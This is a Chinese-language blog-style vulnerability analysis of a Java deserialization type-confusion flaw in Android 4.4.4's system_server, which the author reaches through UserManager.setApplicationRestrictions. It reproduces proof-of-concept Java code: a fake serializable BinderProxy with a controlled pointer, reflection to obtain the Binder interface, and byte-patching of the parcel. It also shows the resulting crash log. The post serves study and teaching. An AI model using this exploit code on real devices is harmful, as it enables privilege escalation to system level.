&lt;h2 id=&quot;分析环境与工具&quot;&gt;&lt;a href=&quot;#分析环境与工具&quot; class=&quot;headerlink&quot; title=&quot;分析环境与工具&quot;&gt;&lt;/a&gt;分析环境与工具&lt;/h2&gt;&lt;p&gt;Android版本：Android4.4.4_r1&lt;br&gt;手机：Nexus5&lt;br&gt;IDA 6.5&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;由于网上已有分析文献加上本人文笔有限，本文将根据参考文献进行更加细致的分析。&lt;br&gt;为了方便阅读，下面我贴上部分参考文献，并补充我在分析时对漏洞的理解：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在Jann Horm给出的漏洞信息与POC中(1]，向system_server传入的是不可序列化的android.os.BinderProxy对象实例，其成员变量在反序列化时发生类型混淆，由于BinderProxy的finalize方法包含本地代码，于是在本地代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，也就意味着攻击者可以控制该指针，使其指向攻击者可控的地址空间，最终获得在system_server（uid=1000）中执行代码的权限。下面主要结合POC对漏洞进行详细分析，由于笔者之前对相关的Java序列化、Android binder跨进程通信和native代码都不太熟悉，主要根据参考文献进行翻译、整理和理解，不当之处，还请读者海涵。&lt;/p&gt;
&lt;h3 id=&quot;Java层分析&quot;&gt;&lt;a href=&quot;#Java层分析&quot; class=&quot;headerlink&quot; title=&quot;Java层分析&quot;&gt;&lt;/a&gt;Java层分析&lt;/h3&gt;&lt;h4 id=&quot;第一步，构建一可序列化的恶意对象&quot;&gt;&lt;a href=&quot;#第一步，构建一可序列化的恶意对象&quot; class=&quot;headerlink&quot; title=&quot;第一步，构建一可序列化的恶意对象&quot;&gt;&lt;/a&gt;第一步，构建一可序列化的恶意对象&lt;/h4&gt;&lt;p&gt;创建AAdroid.os.BinderProxy对象，并将其放入Bundle数据中：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Bundle bundle = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Bundle();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;AAdroid.os.BinderProxy evilProxy = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; AAdroid.os.BinderProxy();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bundle.putSerializable(&lt;span class=&quot;string&quot;&gt;&quot;eatthis&quot;&lt;/span&gt;, evilProxy);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意AAdroid.os.BinderProxy是可序列化的，其成员变量mOrgue就是随后用于改变程序执行流程的指针。随后该可序列化的AAdroid.os.BinderProxy将在传入system_server之间修改为不可序列化的Android.os.BinderProxy对象：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;BinderProxy&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Serializable&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; serialVersionUID = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//public long mObject = 0x1337beef;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//public long mOrgue = 0x1337beef;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//注意：此处要根据待测的Android版本号设置，在我们待测试的Android 4.4.4中，BinderProxy的这两个Field为private int，这样才能保证POC访问的地址为我们设置的值0x1337beef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; mObject = &lt;span class=&quot;number&quot;&gt;0x1337beef&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; mOrgue = &lt;span class=&quot;number&quot;&gt;0x1337beef&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;AAdroid.os.BinderProxy可序列化的原因是我们需要首先将恶意对象序列化并存入bundle对象中，才能将其传递给system_server进程。&lt;br&gt;mOrgue和mObject的类型可以查看源码（frameworks/base/core/java/android/os/Binder.java）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;第二步，准备传入system-server的数据&quot;&gt;&lt;a href=&quot;#第二步，准备传入system-server的数据&quot; class=&quot;headerlink&quot; title=&quot;第二步，准备传入system_server的数据&quot;&gt;&lt;/a&gt;第二步，准备传入system_server的数据&lt;/h4&gt;&lt;p&gt;主要通过一系列java的反射机制，获得android.os.IUserManager.Stub和andrioid.os.IUserManager.Stub.Proxy的Class对象，最终获得跨进程调用system_server的IBinder接口mRemote，以及调用UserManager.setApplicationRestriction函数的TRANSACTION_setApplicationRestriction，为与system_server的跨进程Binder通信作准备：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Class stubClass = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (Class inner : Class.forName(&lt;span class=&quot;string&quot;&gt;&quot;android.os.IUserManager&quot;&lt;/span&gt;).getDeclaredClasses()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (inner.getCanonicalName().equals(&lt;span class=&quot;string&quot;&gt;&quot;android.os.IUserManager.Stub&quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        stubClass = inner;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(&lt;span class=&quot;string&quot;&gt;&quot;TRANSACTION_setApplicationRestrictions&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;TRANSACTION_setApplicationRestrictionsField.setAccessible(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(&lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Class proxyClass = &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (Class inner : stubClass.getDeclaredClasses()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (inner.getCanonicalName().equals(&lt;span class=&quot;string&quot;&gt;&quot;android.os.IUserManager.Stub.Proxy&quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        proxyClass = inner;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Field mServiceField = UserManager.class.getDeclaredField(&lt;span class=&quot;string&quot;&gt;&quot;mService&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mServiceField.setAccessible(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Object mService = mServiceField.get(userManager);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Field mRemoteField = proxyClass.getDeclaredField(&lt;span class=&quot;string&quot;&gt;&quot;mRemote&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mRemoteField.setAccessible(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mRemote = (IBinder) mRemoteField.get(mService);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;UserHandle userHandle = android.os.Process.myUserHandle();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里有一个很基础的问题，为什么我们一定要把这个对象传递进system_server进程呢？system_server进程拥有system权限，我们通过将对象传递给system_server，利用一些技巧达到提权到system的目的。&lt;br&gt;这段连续的java反射涉及到了Android binder进程间通讯的知识，有兴趣的可以下来深入研究。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;第三步，向system-server传入不可序列化的Bundle参数&quot;&gt;&lt;a href=&quot;#第三步，向system-server传入不可序列化的Bundle参数&quot; class=&quot;headerlink&quot; title=&quot;第三步，向system_server传入不可序列化的Bundle参数&quot;&gt;&lt;/a&gt;第三步，向system_server传入不可序列化的Bundle参数&lt;/h4&gt;&lt;p&gt;调用setApplicationRestrictions这个函数，传入之前打包evilproxy的Bundle数据作为参数。将该函数与Android源码中的setApplicationRestrication函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server的Android.os.UserManager.setApplicationRestrictions方法：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;setApplicationRestrictions&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(java.lang.String packageName, android.os.Bundle restrictions, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; userHandle)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; android.os.RemoteException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	android.os.Parcel _data = android.os.Parcel.obtain();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	android.os.Parcel _reply = android.os.Parcel.obtain();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data.writeInterfaceToken(DESCRIPTOR);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data.writeString(packageName);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data.writeInt(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   restrictions.writeToParcel(_data, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data.writeInt(userHandle);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[] data = _data.marshall();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	       &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (data[i] == &lt;span class=&quot;string&quot;&gt;&#39;A&#39;&lt;/span&gt; &amp;amp;&amp;amp; data[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;A&#39;&lt;/span&gt; &amp;amp;&amp;amp; data[i+&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;d&#39;&lt;/span&gt; &amp;amp;&amp;amp; data[i+&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;r&#39;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	           data[i] = &lt;span class=&quot;string&quot;&gt;&#39;a&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	           data[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = &lt;span class=&quot;string&quot;&gt;&#39;n&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	           &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data.recycle();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data = Parcel.obtain();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data.unmarshall(data, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, data.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _reply.readException();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;finally&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _reply.recycle();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   _data.recycle();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;事实上，我们并非必须使用Android.os.UserManager.setApplicationRestrictions方法向system_server传递对象，我们需要的是找到一个途径将序列化后的对象传递进system_server进程，并且system_server会将该对象反序列化，只要满足这样的条件均可。&lt;br&gt;还有一个问题：为什么我们要修改AAdroid.os.BinderProxy为Android.os.BinderProxy？这个问题我将会在后面解释。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;安装POC，启动Activity后将其最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，system_server执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问了不该访问的内存，导致异常。错误信号、寄存器快照和调用栈如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:55.974: I/DEBUG(3695): Build fingerprint: &amp;apos;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:55.974: I/DEBUG(3695): Revision: &amp;apos;11&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:55.974: I/DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon  &amp;gt;&amp;gt;&amp;gt; system_server &amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:55.974: I/DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:56.064: I/DEBUG(3695):     r0 1337beef  r1 401b89d9  r2 746fdad8  r3 6d4fbdc4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:56.064: I/DEBUG(3695):     r4 401b89d9  r5 1337beef  r6 713e3f68  r7 1337beef&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:56.064: I/DEBUG(3695):     r8 1337beef  r9 74709f68  sl 746fdae8  fp 74aacb24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05-14 18:30:56.064: I/DEBUG(3695):     ip 401f08a4  sp 74aacae8  lr 401b7981  pc 40105176  cpsr 200d0030&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241): backtrace:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #00  pc 0000d176  /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #01  pc 0007097d  /system/lib/libandroid_runtime.so&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #02  pc 0001dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+112)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #03  pc 0004e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #04  pc 00026fe0  /system/lib/libdvm.so&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #05  pc 0002dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #06  pc 0002b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #07  pc 0006057d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #08  pc 000605a1  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #09  pc 00055287  /system/lib/libdvm.so&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #10  pc 0000d170  /system/lib/libc.so (__thread_entry+72)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I/DEBUG   (  241):     #11  pc 0000d308  /system/lib/libc.so (pthread_create+240)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
